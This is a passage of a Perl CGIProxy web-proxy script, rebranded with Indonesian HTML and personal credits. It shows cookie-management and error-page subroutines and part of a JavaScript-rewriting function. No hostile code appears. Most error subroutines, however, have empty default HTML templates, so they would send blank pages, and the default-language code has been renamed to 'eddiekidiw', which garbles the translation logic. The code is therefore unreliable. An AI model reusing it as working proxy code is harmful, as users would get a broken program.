RvdzojMDAwIDFweCAxcHggMnB4OyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybChkYXRhOmltYWdlL2dpZjtiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQUFFQUFBQVNDQVlBQUFDYVY3UzhBQUFBWlVsRVFWUjQyZ0ZhQUtYL0FBSUJBQUFBQlFNQURnQUlCQUFjQUFzR0FDb0FEd2dBT0FBVENnQkdBQmNOQUZVQUhBOEFZd0FnRVFCeEFDVVVBSDhBS1JZQWpRQXVHUUNiQURJYkFLb0FOaDBBdUFBNkh3REdBRDBoQU5RQVFDTUE0Z0JFSkFEd1d1Z01MbWVFaC84QUFBQUFTVVZPUks1Q1lJST0pOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICM1YzI5MDF9DQoudG1uIGE6bGluaywgLnRtbiBhOnZpc2l0ZWQsIC5mbWVudSBhOmxpbmssIC5mbWVudSBhOnZpc2l0ZWR7Y29sb3I6I2I5NDIwMTsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGJvcmRlci1ib3R0b206MXB4IGRvdHRlZCAjNjAyMjAwfQ0KLnRtbiBhOmhvdmVyLCAuZm1lbnUgYTpob3Zlcntjb2xvcjojZmY1YTAwOyBib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzkzMzQwMH0=" /></head><body><center><h3 class="header"><a href="%s">Kembali Ke Halaman awal</a></h3><h3 class="rmenu"><a href="%s">Hapus Semua Cookie</a></h3><h1 class="gmenu">Berikut adalah cookie yang Anda gunakan melalui CGIProxy:</h1>
<form action="%s" method=post>
%s<input type=submit value="%s"class="rmenu"></font><table class="phdr" border=1>%s%s</table><h3 class="header">Otentikasi cookie:</h3><table class="logo"><tr><th class="rmenu">Hapus cookie ini?</th><th class="footer">Server</th><th class="gmenu">Pengguna</th><th class="phdr">Alam</th></tr>%s</table><input type=submit value="%s"class="phdr"></font></form><div class="footer"><font color="lime">&copy; 2014 <a href="http://facebook.com/profile.php?id=1399936703605827"><font color="orange">Rdcpc</font></a><br /><font color="lime">Design by <a href="http://facebook.com/eddiekidiw"></font><font color="orange">Saint Eddie Kidiw</font></a></center></div></div></body></html>
EOR
    $response= sprintf($response, $dir, $return_url, $clear_cookies_url, $action, $from_tag,
		       $delete_selected_cookies, $cookie_header_row, $cookie_rows, $auth_rows,
		       $delete_selected_cookies)
		   . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
Cache-Control: no-cache
Pragma: no-cache
Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub get_auth_from_user {
    my($server, $realm, $URL, $tried)= @_ ;
    my($action, $msg) ;
    my($date_header)= &rfc1123_date($now, 0) ;

    $server= &HTMLescape($server) ;
    $realm=  &HTMLescape($realm) ;
    $URL=    &HTMLescape(&wrap_proxy_encode($URL)) ;

    $action= &HTMLescape( $url_start . &wrap_proxy_encode('x-proxy://auth/make_auth_cookie') ) ;

    if ($tried) {
	$msg= 'Authorization failed.  Try again.' ;
	$msg= $MSG{$lang}{$msg} || $msg  if $lang ne 'eddiekidiw' and $lang ne '' ;
	$msg= "<h3><font color=red>$msg</font></h3>"
    }

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOR  : $MSG{$lang}{'get_auth_from_user.response'} ;

EOR
    $response= sprintf($response, $dir, $realm, $server, $msg, $action,
		       $server, $realm, $URL, $realm, $server)
		   . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
Cache-Control: no-cache
Pragma: no-cache
Date: $date_header
Content-type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}

# Alert the user to an unsupported URL, with this intermediate page.
sub unsupported_warning {
    my($URL)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;

    &redirect_to($URL) if $URL eq 'about:blank' ;
    &redirect_to($URL) if $QUIETLY_EXIT_PROXY_SESSION ;

    # Prevent a XSS attack.
    $URL= &HTMLescape($URL) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'unsupported_warning.response'} ;

EOR
    $response= sprintf($response, $dir, $URL, $URL) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


# Alert the user that SSL is not supported, with this intermediate page.
sub no_SSL_warning {
    my($URL)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;

    &redirect_to($URL) if $QUIETLY_EXIT_PROXY_SESSION ;

    # Prevent a XSS attack.
    $URL= &HTMLescape($URL) ;
    my $homepage= &HTMLescape(full_url('http://www.jmarshall.com/tools/cgiproxy/')) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'no_SSL_warning.response'} ;

EOR
    $response= sprintf($response, $dir, $homepage, $URL, $URL) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


# Alert the user that gzip is not supported.
sub no_gzip_die {
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $hostst= $host=~ /:/  ? "[$host]"  : $host ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'no_gzip_die.response'} ;

EOR
    $response= sprintf($response, $dir, $hostst, $port) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


# Return "403 Forbidden" message if the target server is forbidden.
sub banned_server_die {
    my($URL)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;

    # Here, only quietly redirect out if we get a URL.  This allows calling
    #   routines to force an error, such as when using @BANNED_NETWORKS, or
    #   when a URL is not available.
    &redirect_to($URL) if $QUIETLY_EXIT_PROXY_SESSION && ($URL ne '') ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'banned_server_die.response'} ;

EOR
    $response= sprintf($response, $dir) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 403 Forbidden
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}

# Return "403 Forbidden" message if the user's IP address is disallowed.
sub banned_user_die {
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'banned_user_die.response'} ;

EOR
    $response= sprintf($response, $dir) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 403 Forbidden
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub loop_disallowed_die {
    my($URL)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'loop_disallowed_die.response'} ;

EOR
    $response= sprintf($response, $dir, $URL, $URL) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 403 Forbidden
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub insecure_die {
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'insecure_die.response'} ;

EOR
    $response= sprintf($response, $dir) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}

# Return "403 Forbidden" response for script content-type.
sub script_content_die {
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'script_content_die.response'} ;

EOR
    $response= sprintf($response, $dir) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 403 Forbidden
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub non_text_die {
    &return_empty_gif if $RETURN_EMPTY_GIF ;

    my($date_header)= &rfc1123_date($now, 0) ;

    my $homepage= &HTMLescape(full_url('http://www.jmarshall.com/tools/cgiproxy/')) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'non_text_die.response'} ;

EOR
    $response= sprintf($response, $dir, $homepage) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 403 Forbidden
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub no_Encode_die {
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'no_Encode_die.response'} ;

EOR
    $response= sprintf($response, $dir) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub malformed_unicode_die {
    my($charset)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;

    get_translations($lang)  if $lang ne 'eddiekidiw' and $lang ne '' ;
    my $response= $lang eq 'eddiekidiw' || $lang eq ''
	? <<EOR  : $MSG{$lang}{'malformed_unicode_die.response'} ;

EOR
    $response= sprintf($response, $dir, $charset) . footer() ;
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub return_401_response {
    my($client_http_version)= @_ ;
    my($date_header)= &rfc1123_date($now, 0) ;
    $HTTP_1_X=  $NOT_RUNNING_AS_NPH   ? 'Status:'   : $client_http_version ;

    print $STDOUT <<EOR ;
$HTTP_1_X 401 Unauthorized
Date: $date_header
WWW-Authenticate: Basic realm="proxy"

EOR
    # Do not exit-- this is called in a while() loop from handle_http_request() .
}



sub HTMLdie {
    my($msg, $title, $status)= @_ ;
    my($h3_title, $h1_title) ;

    $title= 'CGIProxy Error' if $title eq '' ;

    # Handle translations, and array-based $msg and $title.
    if ($lang ne 'eddiekidiw' and $lang ne '') {
	get_translations($lang) ;
	if (ref($msg) eq 'ARRAY') {
	    my($eng_format)= shift(@$msg) ;
	    my($format)= $MSG{$lang}{$eng_format} || $eng_format ;
	    $h3_title= ' title="' . &HTMLescape(sprintf($eng_format, @$msg)) . '"' ;
	    $msg= sprintf($format, @$msg) ;
	} else {
	    $h3_title= ' title="' . &HTMLescape($msg) . '"' ;
	    $msg= $MSG{$lang}{$msg} || $msg ;
	}
	if (ref($title) eq 'ARRAY') {
	    my($eng_format)= shift(@$title) ;
	    my($format)= $MSG{$lang}{$eng_format} || $eng_format ;
	    $h1_title= ' title="' . &HTMLescape(sprintf($eng_format, @$title)) . '"' ;
	    $title= sprintf($format, @$title) ;
	} else {
	    $h1_title= ' title="' . &HTMLescape($title) . '"' ;
	    $title= $MSG{$lang}{$title} || $title ;
	}
    } else {
	my($format) ;
	$format= shift(@$msg),   $msg=   sprintf($format, @$msg)    if ref($msg)   eq 'ARRAY' ;
	$format= shift(@$title), $title= sprintf($format, @$title)  if ref($title) eq 'ARRAY' ;
	$h3_title= $h1_title= '' ;
    }

    # Don't use HTML if run from the command line.
    die "$msg\n" if $RUN_METHOD eq 'fastcgi' or $RUN_METHOD eq 'embedded' ;

    $status= '200 OK' if $status eq '' ;
    my($date_header)= &rfc1123_date($now, 0) ;

    # In case this is called early, set $HTTP_1_X to something that works.
    $HTTP_1_X=  $NOT_RUNNING_AS_NPH   ? 'Status:'   : "HTTP/1.0"
	if $HTTP_1_X eq '' ;

    my $response= <<EOR . footer() ;
<html$dir>
<head><title>$title</title></head>
<body>
<h1$h1_title>$title</h1>
<h3$h3_title>$msg</h3>
EOR
    eval { $response= encode('utf-8', $response) } ;

    my $cl= length($response) ;
    print $STDOUT <<EOH . $response ;
$HTTP_1_X $status
Cache-Control: no-cache
Pragma: no-cache
Date: $date_header
Content-Type: text/html; charset=utf-8
Content-Length: $cl

EOH
    die "exiting" ;
}


sub proxify_js {
    my($in, $top_level, $with_level, $in_new_statement)= @_ ;
    $with_level||= 0 ;
    $in_new_statement||= 0 ;

    # Declaring variables here rather than in blocks below is a little faster.
    my(@out, $element, $token, $last_token, $new_last_token, $newline_since_last_token, $div_ok,
       $term_so_far, $prefix, $sub_expr, $op, $new_val, $cur_val_str,
       $in_braces, $in_func, $expr, $next_expr,
       $var_decl, $var, $eq, $value, $skip1, $skip2, $funcname, $with_obj, $code, $paren,
       $closequote1, $closequote2) ;

    # $does_write has to be communicated out of nested calls, so it's a global.
    #   Kind of hacky.
    $does_write= 0  if $top_level ;

    # Some sites erroneously have HTML comments in <script> blocks, which
    #   browsers try to work around.  :P  For now, remove one-line HTML
    #   comments and declarations from the start of a script block.
    1 while ($in=~ s/^\s*(?:<!--.*?-->\s*)+//
	  or $in=~ s/^\s*(?:<!.*?>\s*)+//    ) ;

    # MSIE fails when uncommented "-->" is encountered in the middle of a
    #   script, like when we insert "_proxy_jslib_flush_write_buffers()" at
    #   the end.  Thus, remove leading "<!--" and trailing "-->".
    # Also remove the remainder of the first line after the "<!--".
    $in=~ s/^\s*<!--[^\n]*(.*)-->\s*$/$1/s ;


    # Note that these patterns contain an embedded set of parentheses that
    #   only match if the input element is a token.
    # Correction:  Because of Perl's long-string-literal bug, there are two
    #   additional sets of embedded parentheses, which may match /'/ or /"/ .
  OUTER:
    while ($div_ok  ? $in=~ /\G($RE_JS_INPUT_ELEMENT_DIV)/gco
		    : $in=~ /\G($RE_JS_INPUT_ELEMENT_REG_EXP)/gco) {

	($element, $token, $closequote1, $closequote2)= ($1, $2, $3, $4) ;

	# To work around Perl's long-string-literal bug, read in rest of
	#   string literal if needed.
	if ($token=~ /^['"]/ && !$closequote1 && !$closequote2) {
	    last unless &get_string_literal_remainder(\$in, \$token) ;
	    $element= $token ;
	}

	# If a token was gotten, then set $div_ok according to the token.
	#   Until we get a more complete parser, this is a pretty good guess.
	#   Note that here, "token" also includes DivPunctuator and
	#   RegularExpressionLiteral.
	# DivPunctuator may come after: certain reserved words, identifiers,
	#   the four punctuators ") ] ++ --", numeric and string literals,
	#   and regular expression literals.  To match identifiers but not
	#   the wrong reserved words, it's probably easier to include all
	#   identifiers, then just exclude those reserved words which may
	#   precede RegularExpressionLiteral.  The last line of the pattern
	#   below tests the start of the token for several possible token
	#   types, combined into one pattern.
	# Reserved words that may precede DivPunctuator are qw(this null true false);
	#   reserved words that may precede RegularExpressionLiteral are
	#   qw(case delete do else in instanceof new return throw typeof void).
	# NOTE: We no longer use this regex here, but instead set $div_ok
	#   in each appropriate block of code below.  This saves about 5%
	#   of the entire call to proxify_js().  (We still use the regex in
	#   get_next_js_expr(), however.)

	#if (defined($token)) {
	#    $div_ok= $token=~ m#^(?:\)|\]|\+\+|--)$|
	#			^(?!(?:case|delete|do|else|in|instanceof|new|return|throw|typeof|void)$)
	#			 (?:\pL|[\$_\\0-9'"]|\.\d|/..)#x ;
	#}


	$newline_since_last_token= 1 if $element=~ /^$RE_JS_LINE_TERMINATOR$/o ;
	$new_last_token= '' ;

	# Keep track of whether we're in a function, to correctly handle returns.
	$in_braces++ if $token eq '{' ;
	$in_braces-- if $token eq '}' ;
	$in_func= 0 if $in_braces==0 ;


	# Now, handle cases depending on value of $token.


	# Only allow whitespace within a term, not comments, or else removing
	#   the final "." gets messy later.  Don't remove white space
	#   altogether, since it's needed to separate tokens correctly.  Line
	#   terminators also have to be preserved, for the sake of automatic
	#   semicolon insertion and other syntactic constructs.
	if ($token eq '') {
	    if ($term_so_far ne '') {
		if ($element=~ /$RE_JS_LINE_TERMINATOR/o) {
		    $term_so_far.= "\n" ;
		} else {
		    $term_so_far.= ' ' ;
		}
	    } else {
		push(@out, $element) ;
	    }


	# Treat these as beginning a term.
	# Due to Perl's long-string-literal bug, string literals are matched
	#   by /^['"]/ rather than by $RE_JS_STRING_LITERAL.
	#} elsif ($token=~ /^(?:$RE_JS_NUMERIC_LITERAL|$RE_JS_STRING_LITERAL|$RE_JS_REGULAR_EXPRESSION_LITERAL)$/o) {
	} elsif ($token=~ /^(?:$RE_JS_NUMERIC_LITERAL|$RE_JS_REGULAR_EXPRESSION_LITERAL)$/o
		 or $token=~ /^['"]/) {
	    push(@out, $prefix, $term_so_far) ;
	    $prefix= '' ;
	    $term_so_far= $token ;
	    $div_ok= 1 ;


	# Now all input elements are handled except identifiers (including
	#   reserved words) and all punctuators (including DivPunctuator).
	# All punctuators end a term except for .[(, which each need a special
	#   block here to handle them; all punctuators that are
	#   AssignmentOperator or ++/-- must also be handled specially.


	# Handle increment and decrement operators, and "delete", using this
	#   simplification:  ++/-- is post- if there's a term so far and
	#   not a newline since the last token, and pre- otherwise.
	#   Pre- operators become the "prefix" parameter in the call to
	#   _proxy_jslib_assign(); with post- operators, $prefix and
	#   $term_so_far are pushed onto @out, then the operator itself.
	#   Note that $term_so_far may have already been transformed during
	#   the processing of a previous token.
	# Handle case when parentheses surround the term, e.g. "delete(a.b)" .
	} elsif ($token eq '++' or $token eq '--' or $token eq 'delete') {
	    # Handle "-->" instead of "--" if needed.
	    if ($token eq '--' and $in=~ /\G\s*>/gco) {
		push(@out, $prefix, $term_so_far, '-->') ;
		$prefix= $term_so_far= '' ;
	    } elsif (($term_so_far ne '') and !$newline_since_last_token) {
		push(@out, $prefix, $term_so_far, $token) ;
		$prefix= $term_so_far= '' ;
		$div_ok= 1 ;
	    } else {
		push(@out, $prefix, $term_so_far) ;
		$prefix= $term_so_far= '' ;
		my $start_paren= $in=~ /\G$RE_JS_SKIP*\(/gco ;
		my($o, $p)= &get_next_js_term(\$in) ;
		last unless defined($p) ;
		last if $start_paren and !($in=~ /\G$RE_JS_SKIP*\)/gco) ; 
		if ($o ne '') {
		    push(@out, " _proxy_jslib_assign('$token', (" . (&proxify_js($o, 0, $with_level))[0] . "), (" . (&proxify_js($p, 0, $with_level))[0] . "), '')" ) ;
		} else {
		    # Note that $p is guaranteed to be a quoted identifier here.
		    $p=~ s/^'|'$//g ;
		    if ($token eq 'delete') {
			push(@out, "delete $p");
		    } elsif ($p ne 'location') {
			push(@out, $token, $p) ;
		    } else {
			push(@out, "($p= _proxy_jslib_assign_rval('$token', '$p', '', '', (typeof $p=='undefined' ? void 0 : $p)))") ;
		    }
		}
		$div_ok= 1 ;

#		$prefix= $token ;
	    }


	} elsif (($token eq 'eval') && $in=~ /\G($RE_JS_SKIP*\()/gco) {
	    $needs_jslib= 1 ;
	    my $has_dot= $term_so_far=~ /\.(?:(?>$RE_JS_WHITE_SPACE+)|$RE_JS_LINE_TERMINATOR)*\z/ ;
	    $term_so_far= $has_dot
		?  "(_proxy_jslib_eval_ok ? $term_so_far eval(_proxy_jslib_proxify_js(("
		  . (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0]
		  . "), 0, $with_level) ) : _proxy_jslib_throw_csp_error('disallowed eval') )"
		:  "$term_so_far (_proxy_jslib_eval_ok ? eval(_proxy_jslib_proxify_js(("
		  . (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0]
		  . "), 0, $with_level) ) : _proxy_jslib_throw_csp_error('disallowed eval') )" ;
	    last unless $in=~ /\G\)/gc ;
	    $div_ok= 1 ;


	#} elsif ($RE_JS_SET_TRAPPED_PROPERTIES{$token}) {
	} elsif ($token=~ /^(?:open|write|writeln|close|load|eval
			       |setInterval|setTimeout|toString|String
			       |src|currentSrc|href|background|lowsrc|action|formAction|location|poster
			       |URL|url|newURL|oldURL|referrer|baseURI
			       |useMap|longDesc|cite|codeBase|profile
			       |cssText|insertRule|setStringValue|setProperty
			       |backgroundImage|content|cursor|listStyleImage
			       |host|hostname|pathname|port|protocol|search
			       |setNamedItem
			       |innerHTML|outerHTML|outerText|body|parentNode
			       |getElementById|getElementsByTagName
			       |appendChild|replaceChild|insertBefore|removeChild|createElement
			       |text|textContent
			       |insertAdjacentHTML
			       |setAttribute|setAttributeNode|getAttribute
			       |nodeValue
			       |value|cookie|domain|frames|parent|top|opener
			       |execScript|execCommand|navigate
			       |showModalDialog|showModelessDialog|addImport
			       |LoadMovie
			       |origin|postMessage|pushState|replaceState
			       |localStorage|sessionStorage
			       |querySelector|querySelectorAll
			       |send|setRequestHeader|withCredentials
			    )$/x) {
	    $needs_jslib= 1 ;
	    $does_write||= ($token eq 'write') || ($token eq 'writeln') || ($token eq 'eval') ;

	    # Handle automatic semicolon insertion.  For more notes about
	    #   automatic semicolon insertion, see comments in
	    #   get_next_js_expr() below.
	    if ($newline_since_last_token
		and $last_token=~ m#^(?:\)|\]|\+\+|--)$|
				    ^(?!(?:case|delete|do|else|in|instanceof|new|typeof|void|function|var)$)
				     (?:\pL|[\$_\\0-9'"]|\.\d|/..)#x )
	    {
		push(@out, $prefix, $term_so_far) ;
		$prefix= $term_so_far= '' ;
	    }

	    # Remove "." and possible trailing white space from $term_so_far.
	    #   (Comments are no longer included within $term_so_far.)
	    my $had_dot= $term_so_far=~ s/\.((?>$RE_JS_WHITE_SPACE+)|$RE_JS_LINE_TERMINATOR)*\z// ;

	    # Transform to either _proxy_jslib_handle() or _proxy_jslib_assign() call.

	    # Peek ahead to see if the next token is an open parenthesis
	    my $old_pos= pos($in) ;
	    my $next_is_paren= $in=~ /\G$RE_JS_SKIP*\(/gco  ? 1  : 0 ;
	    pos($in)= $old_pos ;

	    # First, avoid modifying property names in object literals, which
	    #   are preceded by "{" or "," and followed by ":" .
	    # Not the cleanest here. but should work.
	    if ($last_token=~ /^[{,]$/ and $in=~ /\G($RE_JS_SKIP*:)/gco) {
		push(@out, $prefix, $term_so_far, $token, $1) ;
		$prefix= $term_so_far= '' ;
		$new_last_token= ':' ;
		$div_ok= 0 ;

	    # Avoid proxifying "String" if it's not followed by "(", to allow
	    #   static method calls to pass unchanged.
	    } elsif ($token eq 'String' and !$next_is_paren) {
		$term_so_far.= '.' if $had_dot ;
		$term_so_far.= $token;
		$div_ok= 1;

	    } elsif ($prefix ne '') {
		if ($term_so_far eq '') {
		    push(@out, ($with_level
				? " $token= _proxy_jslib_with_assign_rval(_proxy_jslib_with_objs, '$prefix', '$token', '', '', $token)"
				: " $token= _proxy_jslib_assign_rval('$prefix', '$token', '', '', (typeof $token=='undefined' ? void 0 : $token))") ) ;
		} else {
		    $term_so_far= " _proxy_jslib_assign('$prefix', $term_so_far, '$token', '', '')" ;
		}
		$prefix= '' ;
		$new_last_token= ')' ;
		$div_ok= 1 ;
	    } elsif ($in=~ /\G$RE_JS_SKIP_NO_LT*(\+\+|--)/gco) {
		$op= $1 ;
		if ($term_so_far eq '') {
		    push(@out, ($with_level
				? " $token= _proxy_jslib_with_assign_rval(_proxy_jslib_with_objs, '', '$token', '$op', '', $token)"
				: " $token= _proxy_jslib_assign_rval('', '$token', '$op', '', (typeof $token=='undefined' ? void 0 : $token))") ) ;
		} else {
		    $term_so_far= " _proxy_jslib_assign('', $term_so_far, '$token', '$op', '')" ;
		}
		$new_last_token= ')' ;
		$div_ok= 1 ;
	    } elsif ($in=~ /\G$RE_JS_SKIP*(>>>=|<<=|>>=|[+*\/%&|^-]?=(?!=))/gco) {
		$op= $1 ;
		$new_val= (&proxify_js(&get_next_js_expr(\$in), 0, $with_level))[0] ;
		if ($term_so_far eq '') {
		    push(@out, ($with_level
				? " $token= _proxy_jslib_with_assign_rval(_proxy_jslib_with_objs, '', '$token', '$op', ($new_val), $token)"
				: " $token= _proxy_jslib_assign_rval('', '$token', '$op', ($new_val), (typeof $token=='undefined' ? void 0 : $token))") ) ;
		} else {
		    $term_so_far= " _proxy_jslib_assign('', $term_so_far, '$token', '$op', ($new_val))" ;
		}
		$new_last_token= ')' ;
		$div_ok= 0 ;
	    } else {
		# Pass object and name of property.  Only pass property's value
		#   if object is null, in which case it is needed for return
		#   value.
		if ($term_so_far eq '') {
		    $term_so_far= ($with_level
				   ? " _proxy_jslib_with_handle(_proxy_jslib_with_objs, '$token', $token, $next_is_paren, $in_new_statement)"
				   : " _proxy_jslib_handle(null, '$token', $token, $next_is_paren, $in_new_statement)" ) ;
		} else {
		    $term_so_far= " _proxy_jslib_handle($term_so_far, '$token', '', $next_is_paren, $in_new_statement)" ;
		}
		$new_last_token= ')' ;
		$div_ok= 1 ;
	    }

	} elsif ($token eq 'applets' or $token eq 'embeds' or $token eq 'forms'
		 or $token eq 'ids' or $token eq 'layers' or $token eq 'anchors'
		 or $token eq 'images' or $token eq 'links')
	{
	    if ($doing_insert_here and $term_so_far ne '' and $in=~ /\G($RE_JS_SKIP*\[)/gco) {
		$skip1= $1 ;
		$next_expr= &get_next_js_expr(\$in,1) ;
		if ($next_expr=~ /^\s*\d+\s*$/) {
		    $term_so_far.= $token . $skip1 . "_proxy_jslib_increments['$token']+(" . (&proxify_js($next_expr, 0, $with_level))[0] . ')]' ;
		} else {
		    $term_so_far.= $token . $skip1 . '(' . (&proxify_js($next_expr, 0, $with_level))[0] . ')]' ;
		}
		last unless $in=~ /\G\]/gc ;
		$new_last_token= ']' ;
	    } else {
		$term_so_far.= $token ;
	    }
	    $div_ok= 1 ;


	} elsif ($token eq 'if' or $token eq 'while' or $token eq 'for'
		 or $token eq 'switch')
	{
	    push(@out, $prefix, $term_so_far, $token) ;
	    $prefix= $term_so_far= '' ;
	    last unless $paren= $in=~ /\G($RE_JS_SKIP*\()/gco ;
	    $paren= $1 ;

	    if ($token ne 'for') {
		push(@out, $paren, (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0], ')') ;
		last unless $in=~ /\G\)/gc ;
		$div_ok= 0 ;

	    # Must handle e.g. "for (a[b] in c)..." -- very messy.
	    } else {
		my $old_pos= pos($in) ;
		if ($in=~ /\G$RE_JS_SKIP*$RE_JS_IDENTIFIER_NAME$RE_JS_SKIP+in\b/gco) {
		    # Normal, non-weird for(a in b) loop.
		    pos($in)= $old_pos ;
		    push(@out, $paren, (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0], ')') ;
		    last unless $in=~ /\G\)/gc ;
		    $div_ok= 0 ;
		} else {
		    # This is case of for(expr...) where expr isn't a simple identifier.
		    my($o, $p)= &get_next_js_term(\$in) ;
		    if (defined($p) and $in=~ /\G($RE_JS_SKIP*in\b)/gco) {
			# This is case of for(expr in b) .
			my $rval= (&proxify_js(&get_next_js_expr(\$in,1), 0, $with_level))[0] ;
			last unless $in=~ /\G\)/gc ;
			my $temp_varname= '_proxy_jslib_temp' . $temp_counter++ ;
			# Handle either following block or following statement
			if ($in=~ /\G$RE_JS_SKIP*\{/gco) {
			    push(@out, $paren, "var $temp_varname in $rval) {",
				" _proxy_jslib_assign('', (" . (&proxify_js($o, 0, $with_level))[0] . "), (" . (&proxify_js($p, 0, $with_level))[0] . "), '=', $temp_varname) ;" ) ;
			} else {
			    my $next_statement= (&proxify_js(&get_next_js_expr(\$in,0), 0, $with_level))[0] ;
			    push(@out, $paren, "var $temp_varname in $rval) {",
